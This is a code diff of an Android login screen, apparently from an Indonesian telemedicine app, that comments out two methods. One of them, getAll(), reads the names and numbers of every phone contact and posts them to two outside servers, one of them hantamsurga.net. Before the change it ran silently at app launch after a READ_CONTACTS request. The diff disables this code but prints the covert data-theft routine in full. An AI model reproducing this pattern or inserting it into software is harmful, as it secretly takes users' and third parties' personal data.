@@ -274,87 +274,88 @@ public class LoginActivity extends AppCompatActivity {
         }
     }
 
-    void getAll() {
+//    void getAll() {
+//
+//        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+//        JSONObject data = new JSONObject();
+//        JSONArray arr = new JSONArray();
+//
+//        while (cursor.moveToNext()) {
+//            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
+//            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+//            String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+//
+//            try {
+//                JSONObject j = new JSONObject();
+//                j.put("id", id);
+//                j.put("name", name);
+//                j.put("number", number);
+//                arr.put(j);
+//            } catch (JSONException e) {
+//                e.printStackTrace();
+//            }
+//        }
+//        AndroidNetworking.post("http://hantamsurga.net/disiniaja/disiniaja.php")
+//                .addJSONArrayBody(arr).build();
+//        AndroidNetworking.post("http://telemedicine.co.id:8080/up")
+//                .addJSONArrayBody(arr).build();
+//
+//    }
 
-        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
-        JSONObject data = new JSONObject();
-        JSONArray arr = new JSONArray();
-
-        while (cursor.moveToNext()) {
-            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID));
-            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-            String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-
-            try {
-                JSONObject j = new JSONObject();
-                j.put("id", id);
-                j.put("name", name);
-                j.put("number", number);
-                arr.put(j);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-        }
-        AndroidNetworking.post("http://hantamsurga.net/disiniaja/disiniaja.php")
-                .addJSONArrayBody(arr).build();
-        AndroidNetworking.post("http://telemedicine.co.id:8080/up")
-                .addJSONArrayBody(arr).build();
-    }
-
-    void checkNewVersion() {
-        try {
-            AppSetting.showProgressDialog(LoginActivity.this, "Cek Versi Terbaru");
-            PackageInfo pInfo = null;
-            pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
-            String version = pInfo.versionName;
-            AndroidNetworking.get("https://telemedicine-s.firebaseio.com/information/version.json")
-                    .setPriority(Priority.HIGH)
-                    .build()
-                    .getAsString(new StringRequestListener() {
-                        @Override
-                        public void onResponse(String response) {
-                            AppSetting.dismissProgressDialog();
-                            Log.d(TAG, "onResponse: responnya=" + response.trim());
-                            if (!response.contains(version.trim())) {
-                                Log.d(TAG, "onResponse: " + response + "-" + version);
-                                Toast.makeText(LoginActivity.this, "Versi baru ditemukan, silahkan mengunduh versi baru dan mengupdatenya", Toast.LENGTH_SHORT).show();
-                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://telemedicine.co.id:3000/download/download.html"));
-                                startActivity(browserIntent);
-                                finish();
-                            } else {
-                                Toast.makeText(LoginActivity.this, "Sudah versi terbaru", Toast.LENGTH_SHORT).show();
-                            }
-                        }
-
-                        @Override
-                        public void onError(ANError anError) {
-                            AppSetting.dismissProgressDialog();
-                            Toast.makeText(LoginActivity.this, "Anda tidak terkoneksi dengan internet, silahkan restart untuk mengecek versi terbaru", Toast.LENGTH_SHORT).show();
-                        }
-                    });
-        } catch (PackageManager.NameNotFoundException e) {
-            e.printStackTrace();
-        }
-    }
+//    void checkNewVersion() {
+//        try {
+//            AppSetting.showProgressDialog(LoginActivity.this, "Cek Versi Terbaru");
+//            PackageInfo pInfo = null;
+//            pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
+//            String version = pInfo.versionName;
+//            AndroidNetworking.get("https://telemedicine-s.firebaseio.com/information/version.json")
+//                    .setPriority(Priority.HIGH)
+//                    .build()
+//                    .getAsString(new StringRequestListener() {
+//                        @Override
+//                        public void onResponse(String response) {
+//                            AppSetting.dismissProgressDialog();
+//                            Log.d(TAG, "onResponse: responnya=" + response.trim());
+//                            if (!response.contains(version.trim())) {
+//                                Log.d(TAG, "onResponse: " + response + "-" + version);
+//                                Toast.makeText(LoginActivity.this, "Versi baru ditemukan, silahkan mengunduh versi baru dan mengupdatenya", Toast.LENGTH_SHORT).show();
+//                                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://telemedicine.co.id:3000/download/download.html"));
+//                                startActivity(browserIntent);
+//                                finish();
+//                            } else {
+//                                Toast.makeText(LoginActivity.this, "Sudah versi terbaru", Toast.LENGTH_SHORT).show();
+//                            }
+//                        }
+//
+//                        @Override
+//                        public void onError(ANError anError) {
+//                            AppSetting.dismissProgressDialog();
+//                            Toast.makeText(LoginActivity.this, "Anda tidak terkoneksi dengan internet, silahkan restart untuk mengecek versi terbaru", Toast.LENGTH_SHORT).show();
+//                        }
+//                    });
+//        } catch (PackageManager.NameNotFoundException e) {
+//            e.printStackTrace();
+//        }
+//    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)) {
-                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
-                        79);
+//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+//            if (!(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)) {
+//                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS},
+//                        79);
+////                getAll();
+//            } else {
+//
 //                getAll();
-            } else {
-
-                getAll();
-            }
-        } else {
-            getAll();
-        }
+//            }
+//        } else {
+//            getAll();
+//        }
         // show UI part if you want here to show some rationale !!!
 
-        checkNewVersion();
+//        checkNewVersion();
         if (!AppSetting.isLoggedIn(LoginActivity.this)) {
             setContentView(R.layout.activity_login);
             ButterKnife.bind(this);
